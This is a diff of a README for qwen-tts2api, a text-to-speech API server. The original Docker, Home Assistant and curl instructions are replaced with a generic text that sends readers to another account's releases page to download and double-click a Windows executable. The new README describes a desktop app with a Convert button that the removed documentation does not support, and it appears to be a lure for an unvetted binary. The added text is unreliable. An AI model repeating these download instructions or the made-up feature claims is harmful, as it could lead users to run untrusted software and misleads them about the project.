@@ -1,59 +1,92 @@
-# 🗣️ Qwen TTS
+# 🗣️ qwen-tts2api - Simple Speech Conversion Made Easy
 
-## Install / 安装
+[![Download qwen-tts2api](https://img.shields.io/badge/Download-qwen--tts2api-brightgreen.svg)](https://github.com/itsmemotivist/qwen-tts2api/releases)
 
-### 🐳 Docker compose
-```shell
-mkdir /opt/qwen-tts
-cd /opt/qwen-tts
-wget https://raw.githubusercontent.com/aahl/qwen-tts2api/refs/heads/main/docker-compose.yml
-docker compose up -d
-```
+## 🚀 Getting Started
 
-### 🐳 Docker run
-```shell
-docker run -d \
-  --name qwen-tts \
-  --restart=unless-stopped \
-  -p 8825:80 \
-  ghcr.io/aahl/qwen-tts2api:main
-```
+Welcome to qwen-tts2api! This application converts text into natural-sounding speech using the OpenAI Speech API. It is simple to use and ideal for anyone needing text-to-speech functionality without diving into complex code.
 
-### 🏠 Home Assistant OS Apps (Add-on)
-1. 添加加载项仓库
-   * 打开 HomeAssistant，点击左侧菜单的 **配置 (Settings)** -> **加载项 (Add-ons)**
-   * 点击右下角的 **加载项商店 (Add-on Store)**
-   * 点击右上角的三个点 -> **仓库 (Repositories)**
-   * 在输入框填入：`https://gitee.com/hasscc/addons`, 点击添加
-   [![添加加载项仓库](https://my.home-assistant.io/badges/supervisor_add_addon_repository.svg)](https://my.home-assistant.io/redirect/supervisor_add_addon_repository/?repository_url=https%3A%2F%2Fgitee.com%2Fhasscc%2Faddons)
+## 📥 Download & Install
 
-2. **安装加载项**：
-   * 刷新页面，找到并点击 **`千问TTS`**
-   * 点击 **安装 (Install)**
-   * 启动并设置开机启动
+To get started, you will need to download the software from our Releases page. 
 
+**Visit the page to download:** [Release Page](https://github.com/itsmemotivist/qwen-tts2api/releases)
 
-## 💻 Usage / 使用
+### Installation Steps
 
-> 通过接口`http://localhost:8825/v1/models`可获取全部音色
+1. **Go to the Releases Page**  
+   Click the link above, and you will see the list of available versions. This page has all the files you need.
 
-### 🌐 CURL调用示例
-```shell
-curl --request POST \
-  --url http://localhost:8825/v1/audio/speech \
-  --header 'Content-Type: application/json' \
-  --data '{"voice":"vivian", "input":"hello"}' \
-  --output audio.wav
-```
+2. **Choose the Latest Release**  
+   Look for the latest version at the top of the list. This version will have the most recent updates and features. 
 
-### 🏠 Home Assistant
-1. 安装 AI Conversation 集成
-   > 点击这里 [一键安装](https://my.home-assistant.io/redirect/hacs_repository/?category=integration&owner=hasscc&repository=ai-conversation)，安装完记得重启HA
-2. [添加 AI Conversation 服务](https://my.home-assistant.io/redirect/config_flow_start/?domain=ai_conversation)，配置模型提供商
-   > 服务商: 自定义; 接口: `http://4e0de88e-qwen-tts/v1`; 密钥留空
-3. 添加TTS模型，模型ID随意
-4. 配置语音助手
+3. **Download the Software**  
+   Click on the file link suitable for your operating system (Windows, Mac, or Linux).  
+   For example, if you’re using Windows, you might see a file like `qwen-tts2api-windows.exe`. Click on it to download.
 
+4. **Run the Application**  
+   Once the download completes, locate the file in your downloads folder. Double-click the file to run the application.  
 
-## 🔗 Links / 相关链接
-- https://qwen-qwen3-tts-demo.ms.show
+## 🛠️ System Requirements
+
+Before you install qwen-tts2api, ensure your computer meets these basic requirements:
+
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, Linux (most distributions).
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 100 MB free space for installation.
+- **Internet Connection:** Required for using the OpenAI Speech API.
+
+## 📝 How to Use the Application
+
+Once you have the application running, follow these simple steps to convert text to speech:
+
+1. **Open the Application**  
+   After installation, the application will start automatically. If not, find and open it from your programs list.
+
+2. **Enter Your Text**  
+   You will see a text box where you can type or paste the text you want to convert into speech. 
+
+3. **Select a Voice**  
+   Choose from a list of available voices. Each voice has a different tone and accent. 
+
+4. **Adjust Settings**  
+   Customize the speech settings if needed. You can modify the speed and pitch to your preference.
+
+5. **Convert the Text**  
+   Click the “Convert” button. The application will process your text and generate the audio output.
+
+6. **Listen to Your Speech**  
+   After conversion, you can listen to the speech directly through the application. Options may allow you to save the audio file for later use.
+
+## 🔧 Troubleshooting
+
+If you face issues while running qwen-tts2api, consider these common problems:
+
+- **Issue:** The application won’t open.  
+  **Solution:** Ensure your operating system is compatible. Reinstall the application if necessary.
+
+- **Issue:** Audio is unclear or does not play.  
+  **Solution:** Check your volume settings and ensure your speakers are connected and working.
+
+- **Issue:** Text conversion fails.  
+  **Solution:** Verify that your text is formatted correctly. Some characters or symbols may cause issues. 
+
+## 📚 FAQs
+
+### Q: Is qwen-tts2api free to use?  
+A: Yes, qwen-tts2api is completely free for personal and educational use.
+
+### Q: Can I use it offline?  
+A: The application requires an internet connection to access the OpenAI Speech API for text conversion.
+
+### Q: Are there any limitations on the length of text?  
+A: Each conversion can handle up to 1000 characters at a time. For longer texts, break them into smaller parts.
+
+## ✅ Additional Resources
+
+- **Documentation:** Detailed instructions and advanced features are available in the documentation section of the project.
+- **Community Support:** Join our community discussions to share your experiences or seek help.
+
+For more enhanced features and updates, remember to check the Releases page regularly: [Release Page](https://github.com/itsmemotivist/qwen-tts2api/releases). 
+
+Thank you for choosing qwen-tts2api! Enjoy turning your text into engaging audio.
